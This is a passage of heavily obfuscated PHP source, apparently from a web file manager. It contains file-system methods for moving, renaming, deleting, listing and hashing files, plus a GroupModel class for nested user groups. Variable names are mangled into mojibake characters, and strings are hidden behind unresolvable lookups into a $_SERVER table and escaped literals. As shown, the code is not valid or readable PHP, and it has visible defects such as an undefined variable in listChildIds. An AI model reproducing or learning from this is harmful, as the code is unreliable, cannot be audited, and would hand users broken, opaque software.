$ÌŒñÜÍö); @chmod($ÌŒñÜÍö, $this->pathAuth); if ($×“éÆ†¾) { return $this->getPathOuter($ÌŒñÜÍö); } $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } public function moveFile($˜ø‡—äÕ, $İ±¹êâ) { $this->mkdir($this->pathFather($İ±¹êâ)); $˜ø‡—äÕ = $this->iconvSystem($˜ø‡—äÕ); $İ±¹êâ = $this->iconvSystem($İ±¹êâ); $˜›ÆúóÅ = intval(@rename($˜ø‡—äÕ, $İ±¹êâ)); if (!$˜›ÆúóÅ) { if ($˜›ÆúóÅ = intval(@copy_64($˜ø‡—äÕ, $İ±¹êâ))) { @unlink($˜ø‡—äÕ); } } @chmod($İ±¹êâ, $this->pathAuth); if ($˜›ÆúóÅ) { return $this->getPathOuter($İ±¹êâ); } $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } public function movePath($‹Ä±ğóì, $ªê¯úª‰, $šë€Ä§Ñ = false) { $ÀáĞ¹‹à =& $_SERVER[¡¬ıÜ ƒ]; $‹Ä±ğóì = $this->iconvSystem($‹Ä±ğóì); $ªê¯úª‰ = $this->iconvSystem($ªê¯úª‰); $Ô©Ëıı¦ = rtrim($ªê¯úª‰, $ÀáĞ¹‹à[8]) . $ÀáĞ¹‹à[8] . ($šë€Ä§Ñ ? $šë€Ä§Ñ : get_path_this($‹Ä±ğóì)); if (file_exists($Ô©Ëıı¦)) { return !1; } $´ä¨§“Ç = intval(@rename($‹Ä±ğóì, $Ô©Ëıı¦)); $´ä¨§“Ç = file_exists($Ô©Ëıı¦); if ($´ä¨§“Ç) { return $this->getPathOuter($Ô©Ëıı¦); } $this->writeLog(__FUNCTION__ . $ÀáĞ¹‹à[1462], !0); return !1; } public function delFile($ŠûÅ€µ) { $ŠûÅ€µ = $this->iconvSystem($ŠûÅ€µ); if (!@unlink($ŠûÅ€µ)) { @chmod($ŠûÅ€µ, $this->pathAuth); if (@unlink($ŠûÅ€µ)) { return !0; } $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); return !1; } return !0; } public function delFolder($ˆáÛ§­Õ) { $ç©¢À‚ =& $_SERVER[¡¬ıÜ ƒ]; $ˆáÛ§­Õ = $this->iconvSystem($ˆáÛ§­Õ); if (!is_dir($ˆáÛ§­Õ)) { return !0; } if (!($ˆĞª»«ğ = opendir($ˆáÛ§­Õ))) { return !1; } while (($¬İñ ¶ë = readdir($ˆĞª»«ğ)) !== !1) { if ($¬İñ ¶ë == $ç©¢À‚[10] || $¬İñ ¶ë == $ç©¢À‚[1374]) { continue; } $•ä¤ÉÕÚ = $ˆáÛ§­Õ . $ç©¢À‚[8] . $¬İñ ¶ë; if (is_file($•ä¤ÉÕÚ) || is_link($•ä¤ÉÕÚ)) { if (!unlink($•ä¤ÉÕÚ)) { chmod($•ä¤ÉÕÚ, $this->pathAuth); if (!unlink($•ä¤ÉÕÚ)) { return !1; } } } else { if (is_dir($•ä¤ÉÕÚ)) { chmod($•ä¤ÉÕÚ, $this->pathAuth); $•ä¤ÉÕÚ = $this->iconvApp($•ä¤ÉÕÚ); if (!$this->delFolder($•ä¤ÉÕÚ)) { return !1; } } } } closedir($ˆĞª»«ğ); return rmdir($ˆáÛ§­Õ); } public function rename($¹çÖ„Ö´, $ŸÇÈ•îæ) { $ÏõÏ†±Ù =& $_SERVER[¡¬ıÜ ƒ]; $œÓñ¯Ã = $this->fileNameAuto($this->pathFather($¹çÖ„Ö´), $ŸÇÈ•îæ); $œÓñ¯Ã = $this->iconvSystem($œÓñ¯Ã); $¹çÖ„Ö´ = $this->iconvSystem($¹çÖ„Ö´); $í½áğ = $this->pathFather($¹çÖ„Ö´); $òŒÊ ­¥ = rtrim($í½áğ, $ÏõÏ†±Ù[8]) . $ÏõÏ†±Ù[8] . $œÓñ¯Ã; $ş¨‡´¨ = @rename($¹çÖ„Ö´, $òŒÊ ­¥); $òŒÊ ­¥ = $this->iconvApp($òŒÊ ­¥); if ($ş¨‡´¨) { return $this->getPathOuter($òŒÊ ­¥); } $this->writeLog(__FUNCTION__ . $ÏõÏ†±Ù[1462], !0); return !1; } public function size($ßÍŠüÆ) { $ßÍŠüÆ = $this->iconvSystem($ßÍŠüÆ); return filesize_64($ßÍŠüÆ); } public function info($€Ğ›½´Ç) { $€Ğ›½´Ç = $this->iconvSystem($€Ğ›½´Ç); if ($this->isFolder($€Ğ›½´Ç)) { return $this->folderInfo($€Ğ›½´Ç); } else { if ($this->isFile($€Ğ›½´Ç)) { return $this->fileInfo($€Ğ›½´Ç); } } return !1; } protected function infoChildren($½‰Üî…Ê, &$Íñ®ìÆ£, $­óÙ×‰ = true) { $•–ªá© =& $_SERVER[¡¬ıÜ ƒ]; check_abort_echo(); $½‰Üî…Ê = rtrim($½‰Üî…Ê, $•–ªá©[8]) . $•–ªá©[8]; if ($­óÙ×‰) { $½‰Üî…Ê = $this->iconvSystem($½‰Üî…Ê); } if (!($æ²öÍ– = @opendir($½‰Üî…Ê))) { return; } while (($¿Øµ¨÷ = readdir($æ²öÍ–)) !== !1) { if ($¿Øµ¨÷ == $•–ªá©[10] || $¿Øµ¨÷ == $•–ªá©[1374]) { continue; } $†ììÃÑÙ = $½‰Üî…Ê . $¿Øµ¨÷; if (is_file($†ììÃÑÙ) || is_link($†ììÃÑÙ)) { $Íñ®ìÆ£[$•–ªá©[80]]++; $Íñ®ìÆ£[$•–ªá©[79]] += filesize_64($†ììÃÑÙ); } else { if (is_dir($†ììÃÑÙ)) { $Íñ®ìÆ£[$•–ªá©[81]]++; $this->infoChildren($†ììÃÑÙ, $Íñ®ìÆ£, !1); } } } closedir($æ²öÍ–); } private function folderInfo($¼¶ëºÏ÷, $Ëœ¹ä¦Ç = false) { $œá¿ä°Û =& $_SERVER[¡¬ıÜ ƒ]; $¼¶ëºÏ÷ = rtrim($¼¶ëºÏ÷, $œá¿ä°Û[8]) . $œá¿ä°Û[8]; $ºËï¤ÂØ = $this->iconvApp($this->pathThis($¼¶ëºÏ÷)); if ($Ëœ¹ä¦Ç) { return array($œá¿ä°Û[32] => $ºËï¤ÂØ, $œá¿ä°Û[87] => $this->getPathOuter($¼¶ëºÏ÷), $œá¿ä°Û[33] => $œá¿ä°Û[78]); } $’¢à‰•Ç = array($œá¿ä°Û[32] => $ºËï¤ÂØ, $œá¿ä°Û[87] => $this->getPathOuter($¼¶ëºÏ÷), $œá¿ä°Û[33] => $œá¿ä°Û[78], $œá¿ä°Û[233] => @filectime($¼¶ëºÏ÷), $œá¿ä°Û[88] => @filemtime($¼¶ëºÏ÷), $œá¿ä°Û[1466] => @fileatime($¼¶ëºÏ÷), $œá¿ä°Û[1467] => is_readable($¼¶ëºÏ÷), $œá¿ä°Û[1468] => is_writable($¼¶ëºÏ÷), $œá¿ä°Û[1469] => get_mode($¼¶ëºÏ÷)); return $’¢à‰•Ç; } private function fileInfo($§¾úŒû, $ŸãÈ¨Íß = false) { $ôåºÖä =& $_SERVER[¡¬ıÜ ƒ]; $«‰ÊÍô = $this->iconvApp($this->pathThis($§¾úŒû)); if ($ŸãÈ¨Íß) { return array($ôåºÖä[32] => $«‰ÊÍô, $ôåºÖä[87] => $this->getPathOuter($§¾úŒû), $ôåºÖä[33] => $ôåºÖä[232], $ôåºÖä[79] => $this->size($§¾úŒû), $ôåºÖä[169] => $this->ext($«‰ÊÍô)); } $¾Úå¿…Ç = array($ôåºÖä[32] => $«‰ÊÍô, $ôåºÖä[87] => $this->getPathOuter($§¾úŒû), $ôåºÖä[33] => $ôåºÖä[232], $ôåºÖä[233] => @filectime($§¾úŒû), $ôåºÖä[88] => @filemtime($§¾úŒû), $ôåºÖä[1466] => @fileatime($§¾úŒû), $ôåºÖä[79] => $this->size($§¾úŒû), $ôåºÖä[169] => $this->ext($«‰ÊÍô), $ôåºÖä[1467] => is_readable($§¾úŒû), $ôåºÖä[1468] => is_writable($§¾úŒû), $ôåºÖä[1469] => get_mode($§¾úŒû)); return $¾Úå¿…Ç; } public function exist($æèÃúô) { $æèÃúô = $this->iconvSystem($æèÃúô); return @file_exists($æèÃúô); } public function isFile($¤ÊóË‡å) { $¤ÊóË‡å = $this->iconvSystem($¤ÊóË‡å); return @is_file($¤ÊóË‡å); } public function isFolder($ìÓòå) { $ìÓòå = $this->iconvSystem($ìÓòå); return @is_dir($ìÓòå); } public function listPath($¾§¿Ô Ÿ, $Ñ´•ğõ = false) { $÷œë³°„ =& $_SERVER[¡¬ıÜ ƒ]; $¾§¿Ô Ÿ = $this->iconvSystem($¾§¿Ô Ÿ); $¾§¿Ô Ÿ = rtrim($¾§¿Ô Ÿ, $÷œë³°„[8]) . $÷œë³°„[8]; $íÉ‹õ¸ = array($÷œë³°„[85] => array(), $÷œë³°„[86] => array()); if (!($ÖœãƒöÛ = @opendir($¾§¿Ô Ÿ))) { return $íÉ‹õ¸; } while (($¸›œÍÕù = readdir($ÖœãƒöÛ)) !== !1) { if ($¸›œÍÕù == $÷œë³°„[10] || $¸›œÍÕù == $÷œë³°„[1374]) { continue; } $Ù·ëîğ = $¾§¿Ô Ÿ . $¸›œÍÕù; if (is_file($Ù·ëîğ)) { $íÉ‹õ¸[$÷œë³°„[86]][] = $this->fileInfo($Ù·ëîğ, $Ñ´•ğõ); } else { $íÉ‹õ¸[$÷œë³°„[85]][] = $this->folderInfo($Ù·ëîğ, $Ñ´•ğõ); } } closedir($ÖœãƒöÛ); return $íÉ‹õ¸; } public function listAll($°Û†Êö , &$ŞîÍú· = array()) { $ğÖ ¶‰¯ =& $_SERVER[¡¬ıÜ ƒ]; $°Û†Êö  = $this->iconvSystem($°Û†Êö ); $°Û†Êö  = rtrim($°Û†Êö , $ğÖ ¶‰¯[8]) . $ğÖ ¶‰¯[8]; if (!($’˜–àô = @opendir($°Û†Êö ))) { return $ŞîÍú·; } while (($–İ©ª„ = readdir($’˜–àô)) !== !1) { if ($–İ©ª„ == $ğÖ ¶‰¯[10] || $–İ©ª„ == $ğÖ ¶‰¯[1374]) { continue; } $Â€¿ªÑ = $°Û†Êö  . $–İ©ª„; $§ßş¬… = is_dir($Â€¿ªÑ) && !is_link($Â€¿ªÑ) ? 1 : 0; $Â€¿ªÑ = $§ßş¬… ? $Â€¿ªÑ . $ğÖ ¶‰¯[8] : $Â€¿ªÑ; $ŞîÍú·[] = array($ğÖ ¶‰¯[87] => $Â€¿ªÑ, $ğÖ ¶‰¯[78] => $§ßş¬…, $ğÖ ¶‰¯[88] => intval(@filemtime($Â€¿ªÑ)), $ğÖ ¶‰¯[79] => $§ßş¬… ? 0 : intval($this->size($Â€¿ªÑ))); if ($§ßş¬…) { $this->listAll($Â€¿ªÑ, $ŞîÍú·); } } closedir($’˜–àô); return $ŞîÍú·; } public function has($¾«”—æ‡, $Ü‚‡è›Ş = false, $œì˜Ìœ = true) { $¾Úª´Şä =& $_SERVER[¡¬ıÜ ƒ]; $¾«”—æ‡ = $this->iconvSystem($¾«”—æ‡); $¾«”—æ‡ = rtrim($¾«”—æ‡, $¾Úª´Şä[8]) . $¾Úª´Şä[8]; if (!($œ‡ŠîÖø = @opendir($¾«”—æ‡))) { return !1; } $ùÓÖÈ = 0; $øË¨ÕµÓ = 0; $÷““‡ü = 0; while (($˜í›¸æç = readdir($œ‡ŠîÖø)) !== !1) { if ($˜í›¸æç == $¾Úª´Şä[10] || $˜í›¸æç == $¾Úª´Şä[1374]) { continue; } $¶§ï¿Æ÷ = $¾«”—æ‡ . $˜í›¸æç; if ($Ü‚‡è›Ş) { $÷““‡ü++; if (@is_file($¶§ï¿Æ÷)) { $ùÓÖÈ++; } else { $øË¨ÕµÓ++; } if ($÷““‡ü > 10000) { break; } continue; } if ($œì˜Ìœ) { if (@is_file($¶§ï¿Æ÷)) { return !0; } } else { if (@is_dir($¶§ï¿Æ÷ . $¾Úª´Şä[8])) { return !0; } } } closedir($œ‡ŠîÖø); if ($Ü‚‡è›Ş) { return array($¾Úª´Şä[241] => $ùÓÖÈ, $¾Úª´Şä[242] => $øË¨ÕµÓ); } return !1; } public function hashSimple($˜½”Áá‚) { $©ªºÄì« =& $_SERVER[¡¬ıÜ ƒ]; if (!$˜½”Áá‚) { return md5($©ªºÄì«[12]); } $˜½”Áá‚ = $this->iconvSystem($˜½”Áá‚); $íŒ’Î™ = $this->size($˜½”Áá‚); $´õ–õËÔ = 200; $ê–Ñëªé = 50; if ($íŒ’Î™ <= $´õ–õËÔ * $ê–Ñëªé) { return $this->hashMd5($˜½”Áá‚) . $íŒ’Î™; } $Œù„Êòƒ = $©ªºÄì«[12]; $‰Ó‹¡ÏÁ = intval($íŒ’Î™ / $ê–Ñëªé); $•Ä¡ÅäŸ = fopen($˜½”Áá‚, $©ªºÄì«[1470]); if (!$•Ä¡ÅäŸ) { return $Œù„Êòƒ; } for ($Ãò¯‚ô = 0; $Ãò¯‚ô < $ê–Ñëªé; $Ãò¯‚ô++) { fseek_64($•Ä¡ÅäŸ, $‰Ó‹¡ÏÁ * $Ãò¯‚ô); $Œù„Êòƒ .= fread($•Ä¡ÅäŸ, $´õ–õËÔ); } fseek_64($•Ä¡ÅäŸ, $íŒ’Î™ - $´õ–õËÔ); $Œù„Êòƒ .= fread($•Ä¡ÅäŸ, $´õ–õËÔ); fclose($•Ä¡ÅäŸ); return md5($Œù„Êòƒ) . $íŒ’Î™; } public function getContent($µÙ’Óæø) { $µÙ’Óæø = $this->iconvSystem($µÙ’Óæø); return file_get_contents($µÙ’Óæø); } public function setContent($ˆÈïÎ†Â, $ÇÔ·Á = '') { $ˆÈïÎ†Â = $this->iconvSystem($ˆÈïÎ†Â); $ŞİÙÜ = @file_put_contents($ˆÈïÎ†Â, $ÇÔ·Á, LOCK_EX); if (!$ŞİÙÜ) { $this->writeLog(__FUNCTION__ . $_SERVER[¡¬ıÜ ƒ][1462], !0); } clearstatcache(); @chmod($ˆÈïÎ†Â, $this->pathAuth); return $ŞİÙÜ === !1 ? !1 : !0; } public function fileSubstr($ø«ÛœÅ, $àŒßî¨ = 0, $õÒ²ì±ê = false) { $‰©â”ûÕ =& $_SERVER[¡¬ıÜ ƒ]; $ø«ÛœÅ = $this->iconvSystem($ø«ÛœÅ); if ($õÒ²ì±ê === !1) { $õÒ²ì±ê = $this->size($ø«ÛœÅ); } if ($õÒ²ì±ê <= 0) { return $‰©â”ûÕ[12]; } $¯¯ˆ·¬ = fopen($ø«ÛœÅ, $‰©â”ûÕ[1470]); if (!$¯¯ˆ·¬) { return !1; } fseek_64($¯¯ˆ·¬, $àŒßî¨); $ç¢Ğò˜¹ = fread($¯¯ˆ·¬, $õÒ²ì±ê); fclose($¯¯ˆ·¬); if (!$ç¢Ğò˜¹) { $this->writeLog(__FUNCTION__ . $‰©â”ûÕ[1462], !0); } return $ç¢Ğò˜¹; } public function upload($Ç¤„ñ—, $“Ìã™ÁÆ, $”Æ”ßÍÜ = false, $ É²·­é = REPEAT_REPLACE) { if ($”Æ”ßÍÜ) { return $this->moveFile($“Ìã™ÁÆ, $Ç¤„ñ—); } return $this->copyFile($“Ìã™ÁÆ, $Ç¤„ñ—); } public function setModifyTime($Û‹Ü’øÖ, $¡áŠàÕ = '') { @touch($Û‹Ü’øÖ, intval($¡áŠàÕ)); } public function download($¢·ñ‚ê‘, $â±ÔÓİ±) { return $this->iconvSystem($¢·ñ‚ê‘); } } goto f¨“›šÂª; c‰•Ûæ‰: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\x70"; protected $tableMeta = array("\164\141\x62\x6c\145\116\x61\155\x65" => "\x67\162\157\x75\160\137\x6d\145\164\141", "\x6d\x65\164\x61\106\x69\145\154\144" => "\x67\x72\x6f\165\160\111\104"); protected function cacheFunctionAlias($æ½É‰’) { $û¿óÇµü =& $_SERVER[¡¬ıÜ ƒ]; return array($û¿óÇµü[2068] => array($æ½É‰’[0], $û¿óÇµü[2069]), $û¿óÇµü[2070] => array($æ½É‰’[0], $û¿óÇµü[2071])); } protected function getInfo($ÖÚÕˆ’§, $Ó—ùŸóï = false) { $ÂÊºò×… = $this->getInfoSimple($ÖÚÕˆ’§); if (!$ÂÊºò×…) { return !1; } if ($Ó—ùŸóï) { return $this->_listDataApplyItem($ÂÊºò×…); } return $this->cacheFunctionGet($_SERVER[¡¬ıÜ ƒ][2072], $ÖÚÕˆ’§); } protected function getInfoSimple($Ä–î€ò„, $±¾äüåí = false) { $›äÈÚœ€ =& $_SERVER[¡¬ıÜ ƒ]; if ($±¾äüåí) { $´ë¸øù = array($›äÈÚœ€[1986] => intval($Ä–î€ò„)); $©ãî¡Ñ = $this->where($´ë¸øù)->find(); return is_array($©ãî¡Ñ) ? $©ãî¡Ñ : array(); } return $this->cacheFunctionGet($›äÈÚœ€[2073], $Ä–î€ò„); } protected function groupAdd($ôã¤”“) { $Œ³Öä‰ğ =& $_SERVER[¡¬ıÜ ƒ]; if (!$ôã¤”“[$Œ³Öä‰ğ[192]] && isset($ôã¤”“[$Œ³Öä‰ğ[1986]]) && $ôã¤”“[$Œ³Öä‰ğ[1986]] == 1) { if ($¯µà¾ß = $this->getInfoSimple($ôã¤”“[$Œ³Öä‰ğ[1986]], !0)) { return $ôã¤”“[$Œ³Öä‰ğ[1986]]; } } else { $¯µà¾ß = $this->getInfoSimple($ôã¤”“[$Œ³Öä‰ğ[192]]); if (!$¯µà¾ß) { return !1; } } $´ş¼‰Âæ = $Œ³Öä‰ğ[595]; if ($¯µà¾ß[$Œ³Öä‰ğ[586]]) { $´ş¼‰Âæ = $¯µà¾ß[$Œ³Öä‰ğ[586]] . $¯µà¾ß[$Œ³Öä‰ğ[1986]] . $Œ³Öä‰ğ[50]; } $¹­ÂÒÀá = array($Œ³Öä‰ğ[496] => $this->groupNameAuto($ôã¤”“[$Œ³Öä‰ğ[192]], $ôã¤”“[$Œ³Öä‰ğ[32]]), $Œ³Öä‰ğ[479] => $ôã¤”“[$Œ³Öä‰ğ[192]], $Œ³Öä‰ğ[657] => $´ş¼‰Âæ, $Œ³Öä‰ğ[2074] => $ôã¤”“[$Œ³Öä‰ğ[1972]], $Œ³Öä‰ğ[2075] => 0, $Œ³Öä‰ğ[1990] => 0); if (isset($ôã¤”“[$Œ³Öä‰ğ[2010]])) { $¹­ÂÒÀá[$Œ³Öä‰ğ[2010]] = $ôã¤”“[$Œ³Öä‰ğ[2010]]; } else { $×ü€ù¤ = $this->max($Œ³Öä‰ğ[2010]); if (!$×ü€ù¤) { $×ü€ù¤ = 0; } $¹­ÂÒÀá[$Œ³Öä‰ğ[2010]] = $×ü€ù¤ + 1; } if (!empty($ôã¤”“[$Œ³Öä‰ğ[1986]])) { $¹­ÂÒÀá[$Œ³Öä‰ğ[1986]] = $ôã¤”“[$Œ³Öä‰ğ[1986]]; } $’È‰Ø¥ğ = $this->add($¹­ÂÒÀá); $this->setNamePinyin($’È‰Ø¥ğ, $¹­ÂÒÀá[$Œ³Öä‰ğ[32]]); if (isset($ôã¤”“[$Œ³Öä‰ğ[2076]])) { $this->metaSet($’È‰Ø¥ğ, array($Œ³Öä‰ğ[2076] => $ôã¤”“[$Œ³Öä‰ğ[2076]], $Œ³Öä‰ğ[2077] => $ôã¤”“[$Œ³Öä‰ğ[2077]])); unset($ôã¤”“[$Œ³Öä‰ğ[2076]]); unset($ôã¤”“[$Œ³Öä‰ğ[2077]]); } Model($Œ³Öä‰ğ[1432])->groupRootAdd($’È‰Ø¥ğ); $this->_clearCache($ôã¤”“[$Œ³Öä‰ğ[192]]); return $’È‰Ø¥ğ; } protected function groupEdit($æÎÕ…³À, $‰‹†¨˜) { $õÙ±¿Òı =& $_SERVER[¡¬ıÜ ƒ]; $Œşµ¼´é = $this->getInfoSimple($æÎÕ…³À); if (!$Œşµ¼´é) { return !1; } if (!empty($‰‹†¨˜[$õÙ±¿Òı[192]])) { $²Û¶—±è = $this->getInfoSimple($‰‹†¨˜[$õÙ±¿Òı[192]]); if (!$²Û¶—±è) { return !1; } if ($Œşµ¼´é[$õÙ±¿Òı[1986]] == $²Û¶—±è[$õÙ±¿Òı[1986]]) { return !1; } if ($‰‹†¨˜[$õÙ±¿Òı[192]] != $Œşµ¼´é[$õÙ±¿Òı[192]]) { if ($²Û¶—±è[$õÙ±¿Òı[586]] !== $Œşµ¼´é[$õÙ±¿Òı[586]] && strpos($²Û¶—±è[$õÙ±¿Òı[586]], $Œşµ¼´é[$õÙ±¿Òı[586]] . $Œşµ¼´é[$õÙ±¿Òı[1986]] . $õÙ±¿Òı[50]) === 0) { return !1; } $‰‹†¨˜[$õÙ±¿Òı[657]] = $²Û¶—±è[$õÙ±¿Òı[586]] . $‰‹†¨˜[$õÙ±¿Òı[192]] . $õÙ±¿Òı[50]; $this->_changeChildLevel($Œşµ¼´é, $²Û¶—±è); $this->_clearCache($²Û¶—±è[$õÙ±¿Òı[1986]]); $this->_clearCache($Œşµ¼´é[$õÙ±¿Òı[192]]); } } if (isset($‰‹†¨˜[$õÙ±¿Òı[32]])) { $this->setNamePinyin($æÎÕ…³À, $‰‹†¨˜[$õÙ±¿Òı[32]]); } if (isset($‰‹†¨˜[$õÙ±¿Òı[2076]])) { $this->metaSet($æÎÕ…³À, array($õÙ±¿Òı[2076] => $‰‹†¨˜[$õÙ±¿Òı[2076]], $õÙ±¿Òı[2077] => $‰‹†¨˜[$õÙ±¿Òı[2077]])); unset($‰‹†¨˜[$õÙ±¿Òı[2076]]); unset($‰‹†¨˜[$õÙ±¿Òı[2077]]); } $this->_clearChildrenCache($Œşµ¼´é); return $this->where(array($õÙ±¿Òı[2078] => $æÎÕ…³À))->save($‰‹†¨˜); } private function _clearChildrenCache($›¯“¿›) { $Öú½ª£ó =& $_SERVER[¡¬ıÜ ƒ]; $ò…ƒ¬³ = array($Öú½ª£ó[657] => array($Öú½ª£ó[617], $›¯“¿›[$Öú½ª£ó[586]] . $›¯“¿›[$Öú½ª£ó[1986]] . $Öú½ª£ó[618])); $’Çš‹– = $this->field($Öú½ª£ó[1986])->where($ò…ƒ¬³)->select(); foreach ($’Çš‹– as $ˆÍŠœ£•) { $this->_clearCache($ˆÍŠœ£•[$Öú½ª£ó[1986]]); } } private function _clearCache($Ô„±®â’) { $ô°õ®Ğ® =& $_SERVER[¡¬ıÜ ƒ]; $this->cacheFunctionClear($ô°õ®Ğ®[2072], $Ô„±®â’); $this->cacheFunctionClear($ô°õ®Ğ®[2073], $Ô„±®â’); } private function _changeChildLevel($Õã–á, $ß™²”œ›, $ı·àÇ¢ = false) { $ÃáÄÓºÜ =& $_SERVER[¡¬ıÜ ƒ]; $Ş¹Ù¶éõ = $Õã–á[$ÃáÄÓºÜ[586]] . $Õã–á[$ÃáÄÓºÜ[1986]] . $ÃáÄÓºÜ[50]; $”áâ¦ÁÉ = $ß™²”œ›[$ÃáÄÓºÜ[586]] . $ß™²”œ›[$ÃáÄÓºÜ[1986]] . $ÃáÄÓºÜ[50] . $Õã–á[$ÃáÄÓºÜ[1986]] . $ÃáÄÓºÜ[50]; if ($ı·àÇ¢) { $”áâ¦ÁÉ = $ß™²”œ›[$ÃáÄÓºÜ[586]] . $ß™²”œ›[$ÃáÄÓºÜ[1986]] . $ÃáÄÓºÜ[50]; } $œ÷ñ–¯Ÿ = array($ÃáÄÓºÜ[657] => array($ÃáÄÓºÜ[617], $Õã–á[$ÃáÄÓºÜ[586]] . $Õã–á[$ÃáÄÓºÜ[1986]] . $ÃáÄÓºÜ[618])); $Ÿ¡Ü®ËÆ = array($ÃáÄÓºÜ[657] => array($ÃáÄÓºÜ[666], "\x72\x65\160\154\x61\x63\145\50\x70\141\162\145\x6e\164\114\145\x76\145\x6c\54\x27{$Ş¹Ù¶éõ}\47\54\x27{$”áâ¦ÁÉ}\47\x29")); $this->_clearChildrenCache($Õã–á); $this->where($œ÷ñ–¯Ÿ)->data($Ÿ¡Ü®ËÆ)->save(); } public function setNamePinyin($¨ğÛó®, $®çŠÁ³ = false) { $°Ô²¹á¸ =& $_SERVER[¡¬ıÜ ƒ]; if (!$®çŠÁ³) { $ú½³•Ø = $this->getInfoSimple($¨ğÛó®); $®çŠÁ³ = $ú½³•Ø[$°Ô²¹á¸[32]]; } if (!Input::check($®çŠÁ³, $°Ô²¹á¸[660])) { $this->metaSet($¨ğÛó®, $°Ô²¹á¸[540], null); $this->metaSet($¨ğÛó®, $°Ô²¹á¸[539], null); return; } $…ÀÜı¯¾ = array($°Ô²¹á¸[540] => str_replace($°Ô²¹á¸[53], $°Ô²¹á¸[12], Pinyin::get($®çŠÁ³)), $°Ô²¹á¸[539] => Pinyin::get($®çŠÁ³, $°Ô²¹á¸[661])); $this->metaSet($¨ğÛó®, $…ÀÜı¯¾); } protected function metaSet($«ŒúĞÂ, $Õ¿ò¹†ı = null, $Ç³ğÍ¯ = null) { $this->_clearCache($«ŒúĞÂ); return parent::metaSet($«ŒúĞÂ, $Õ¿ò¹†ı, $Ç³ğÍ¯); } protected function groupStatus($¹½É‡Àé, $¢Ô—Ëõ) { $é¡§Îˆ =& $_SERVER[¡¬ıÜ ƒ]; $Ÿæ¿ŒÍ£ = $this->getInfoSimple($¹½É‡Àé); if (!$Ÿæ¿ŒÍ£) { return !1; } $this->_clearCache($¹½É‡Àé); return $this->metaSet($¹½É‡Àé, $é¡§Îˆ[830], $¢Ô—Ëõ); if ($¢Ô—Ëõ == $é¡§Îˆ[91]) { $‡´òµ‹¯ = $this->parentLevelArray($Ÿæ¿ŒÍ£[$é¡§Îˆ[586]]); } else { } $‡´òµ‹¯[] = $Ÿæ¿ŒÍ£[$é¡§Îˆ[1986]]; $´Ôêİ = array(); foreach ($‡´òµ‹¯ as $¹½É‡Àé) { $´Ôêİ[] = array($é¡§Îˆ[1986] => $¹½É‡Àé, $é¡§Îˆ[97] => $é¡§Îˆ[830], $é¡§Îˆ[452] => $¢Ô—Ëõ); $this->_clearCache($¹½É‡Àé); } return Model($é¡§Îˆ[2079])->addAll($´Ôêİ, array(), !0); } protected function groupRemove($¬éíÑÚö, $©€ˆš‘ø = false) { $µÀ¨€º× =& $_SERVER[¡¬ıÜ ƒ]; $ÚéÈÀ¶ß = array($µÀ¨€º×[1986] => $¬éíÑÚö); $¦¡¢ÎÃ = $this->where($ÚéÈÀ¶ß)->find(); if (!$¦¡¢ÎÃ || $¦¡¢ÎÃ[$µÀ¨€º×[192]] == 0) { return !1; } if (!$©€ˆš‘ø) { $îŠ®ñÎí = $this->getInfoSimple($¦¡¢ÎÃ[$µÀ¨€º×[192]]); $this->_changeChildLevel($¦¡¢ÎÃ, $îŠ®ñÎí, !0); $this->where(array($µÀ¨€º×[192] => $¬éíÑÚö))->save(array($µÀ¨€º×[192] => $¦¡¢ÎÃ[$µÀ¨€º×[192]])); $this->_clearCache($îŠ®ñÎí[$µÀ¨€º×[1986]]); } Model($µÀ¨€º×[2079])->where($ÚéÈÀ¶ß)->delete(); Model($µÀ¨€º×[2080])->where($ÚéÈÀ¶ß)->delete(); Model($µÀ¨€º×[914])->groupRootRemove($¬éíÑÚö); $this->_clearCache($¦¡¢ÎÃ[$µÀ¨€º×[192]]); return $this->where($ÚéÈÀ¶ß)->delete(); } protected function groupSort($ôğ½æÜµ) { $•Ôëšş¯ =& $_SERVER[¡¬ıÜ ƒ]; $¯¡¯Ùş” = array(); foreach ($ôğ½æÜµ as $ĞŸ¼›µ¨ => $ØŸà”ÜĞ) { $¯¡¯Ùş”[] = array($•Ôëšş¯[1986], $ØŸà”ÜĞ, $•Ôëšş¯[2010], $ĞŸ¼›µ¨ + 1); } $this->saveAll($¯¡¯Ùş”); } public function listData() { $ÁÖª†ø = $this->_makeOrder()->selectPage(50); $this->_listDataApply($ÁÖª†ø[$_SERVER[¡¬ıÜ ƒ][447]]); return $ÁÖª†ø; } private function _makeOrder($™ÆÓñƒ = '') { $Îé„£˜Ä =& $_SERVER[¡¬ıÜ ƒ]; $ÖÔí®Å³ = array($Îé„£˜Ä[1986], $Îé„£˜Ä[32], $Îé„£˜Ä[1974], $Îé„£˜Ä[233]); $èİ¹Âò² = array($Îé„£˜Ä[525] => $Îé„£˜Ä[526], $Îé„£˜Ä[527] => $Îé„£˜Ä[528]); $ì£ŸÃşï = Input::get($Îé„£˜Ä[532], $Îé„£˜Ä[7], $Îé„£˜Ä[1990], $ÖÔí®Å³); $Ÿ“€É¹ü = Input::get($Îé„£˜Ä[533], $Îé„£˜Ä[7], $Îé„£˜Ä[2081], array($Îé„£˜Ä[2081], $Îé„£˜Ä[527])); $Ÿ“€É¹ü = $èİ¹Âò²[$Ÿ“€É¹ü]; $™ÆÓñƒ = $™ÆÓñƒ . "{$ì£ŸÃşï}\x20{$Ÿ“€É¹ü}\x2c\x20\147\x72\x6f\x75\x70\111\x44\x20\x61\163\143"; return $this->order($™ÆÓñƒ); } public function listChild($ªµÚ¼„Â) { $¨Ÿø½ =& $_SERVER[¡¬ıÜ ƒ]; $ßôÂ‹§µ = $this->where(array($¨Ÿø½[192] => $ªµÚ¼„Â))->_makeOrder()->selectPage(200); $this->_listDataApply($ßôÂ‹§µ[$¨Ÿø½[447]]); return $ßôÂ‹§µ; } public function listChildIds($Û´¿‰»°) { $õÂ¬–´ =& $_SERVER[¡¬ıÜ ƒ]; if (is_string($Ã¾ı’Óª)) { $Û´¿‰»° = explode($õÂ¬–´[50], $Û´¿‰»°); } $Ã°½è‰¸ = $this->where(array($õÂ¬–´[1986] => array($õÂ¬–´[7], $Û´¿‰»°)))->field($õÂ¬–´[2082])->select(); if (!$Ã°½è‰¸) { return !1; } $Ë¦½Í± = array(); foreach ($Ã°½è‰¸ as $İª˜ª–µ) { $Ë¦½Í±[] = 